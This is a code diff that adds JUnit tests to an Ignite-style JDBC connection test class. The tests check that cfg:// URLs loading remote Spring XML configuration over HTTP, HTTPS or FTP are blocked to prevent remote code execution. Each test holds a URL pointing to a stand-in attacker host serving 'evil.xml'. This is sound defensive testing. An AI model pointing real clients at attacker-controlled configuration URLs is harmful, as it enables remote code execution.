@@ -296,4 +296,67 @@ public class JdbcConnectionSelfTest extends GridCommonAbstractTest {
             assertTrue(((JdbcConnection)conn).skipReducerOnUpdate());
         }
     }
+
+    /**
+     * Test that JDBC cfg:// URL with remote HTTP location is blocked by default to prevent RCE.
+     */
+    @Test
+    public void testRemoteHttpCfgUrlIsBlocked() {
+        final String url = CFG_URL_PREFIX + "http://attacker.example.com/evil.xml";
+
+        GridTestUtils.assertThrows(
+            log,
+            new Callable<Object>() {
+                @Override public Object call() throws Exception {
+                    try (Connection conn = DriverManager.getConnection(url)) {
+                        return conn;
+                    }
+                }
+            },
+            SQLException.class,
+            "Remote Spring configuration URLs"
+        );
+    }
+
+    /**
+     * Test that JDBC cfg:// URL with remote HTTPS location is blocked by default to prevent RCE.
+     */
+    @Test
+    public void testRemoteHttpsCfgUrlIsBlocked() {
+        final String url = CFG_URL_PREFIX + "https://attacker.example.com/evil.xml";
+
+        GridTestUtils.assertThrows(
+            log,
+            new Callable<Object>() {
+                @Override public Object call() throws Exception {
+                    try (Connection conn = DriverManager.getConnection(url)) {
+                        return conn;
+                    }
+                }
+            },
+            SQLException.class,
+            "Remote Spring configuration URLs"
+        );
+    }
+
+    /**
+     * Test that JDBC cfg:// URL with FTP location is always blocked.
+     */
+    @Test
+    public void testFtpCfgUrlIsAlwaysBlocked() {
+        final String url = CFG_URL_PREFIX + "ftp://attacker.example.com/evil.xml";
+
+        GridTestUtils.assertThrows(
+            log,
+            new Callable<Object>() {
+                @Override public Object call() throws Exception {
+                    try (Connection conn = DriverManager.getConnection(url)) {
+                        return conn;
+                    }
+                }
+            },
+            SQLException.class,
+            "always blocked"
+        );
+    }
 }
